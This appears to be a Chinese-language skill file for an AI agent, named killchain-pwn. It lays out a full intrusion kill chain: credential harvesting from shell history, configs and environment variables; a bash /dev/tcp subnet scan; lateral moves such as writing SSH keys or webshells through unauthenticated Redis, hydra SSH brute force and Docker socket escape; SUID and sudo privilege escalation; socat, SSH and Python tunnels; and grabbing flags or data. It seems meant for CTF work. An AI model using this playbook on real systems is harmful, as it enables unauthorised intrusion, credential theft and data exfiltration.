---
name: killchain-pwn
description: 多阶段渗透——侦察→突破→横向→提权→数据获取完整攻击链。Use when 拿到shell后/内网/多跳/隧道/提权/横向移动。
---

# 多阶段渗透（KillChain）

> 蒸馏自CC挖洞武器库 d23-ssrf-内网渗透 + 实战战例（2026验证）

## 核心流程

```
立足点 → 网络拓扑 → 内网发现 → 横向突破 → 提权 → 数据/Flag
```

## Phase 1 立足点确认（拿到初始权限后）

```bash
# 身份/权限
id; sudo -l; whoami
# 网络拓扑（找新网段！）
ip addr; ip route; cat /etc/hosts; cat /proc/net/arp; cat /etc/resolv.conf
# 历史凭据
history; grep -riE "password|passwd|secret" /home/*/.bash_history /var/www/*/config* 2>/dev/null
# 定时任务/服务
crontab -l; ls -la /etc/cron*; systemctl list-units --type=service 2>/dev/null | head -30
# 环境变量/进程凭据
env; ps aux | grep -iE "password|secret|mysql|redis"
```

## Phase 2 内网发现

```bash
# 无nmap时用bash扫（/dev/tcp）
for i in $(seq 1 254); do (timeout 0.3 bash -c "echo >/dev/tcp/10.0.0.$i/80" 2>/dev/null && echo "10.0.0.$i:80 open") & done; wait
# 常见端口批量：22/3306/6379/8080/9200/11211
# 有nmap：nmap -sT -Pn -p- --min-rate 1000 10.0.0.0/24
```

## Phase 3 横向突破（按服务选打法）

| 服务 | 打法 |
|---|---|
| Redis 6379无认证 | redis-cli → CONFIG GET dir → 写authorized_keys/webshell |
| MySQL 3306弱口令 | root/root → select load_file('/etc/passwd') |
| SSH 22弱口令 | hydra -l root -P 字典 ssh://X |
| HTTP 8080 | 指纹→Web漏洞（复用Web skill） |
| ES 9200 | 未授权→_cat/indices→数据 |
| Docker 2375 | 未授权→docker -H X ps→挂载逃逸 |

## Phase 4 提权（用户→root）

```bash
# 优先级：sudo > SUID > 可写cron/服务 > 内核exp（闭卷环境）
sudo -l                          # sudo配置（最常见）
find / -perm -4000 -type f 2>/dev/null   # SUID
find / -writable -type f 2>/dev/null | grep -vE "proc|sys" | head -20
# 经典SUID：/usr/bin/passwd（可写/etc/passwd）、find -exec、vim、python
# 内核版本（最后手段）
uname -a; cat /etc/os-release
```

## Phase 5 隧道（需要时）

```bash
# 反弹/正向隧道（闭卷环境用python/php写）
# 端口转发（有socat/nc时）
socat TCP-LISTEN:8888,fork TCP:10.0.0.5:8080 &
# SSH隧道（有SSH时）
ssh -L 8888:10.0.0.5:8080 user@localhost
# python简易代理
python3 -c "import socket,threading;s=socket.socket();s.bind(('0.0.0.0',8888));s.listen(5);[threading.Thread(target=lambda c:(c.sendall(__import__('urllib.request').urlopen('http://'+c.recv(1024).decode()).read()),c.close())).start() for _ in iter(lambda:s.accept(),None)]" &
```

## Phase 6 Flag/数据获取

```
优先级：/root/flag* /home/*/flag* 数据库flag表 环境变量FLAG_* /proc/1/environ
拿到即报告Main Agent，立即提交（凭证红线）
```

## 提交要点

- 完整攻击链（shell→横向→root）= 高危
- 每步带证据（命令输出/权限变化）
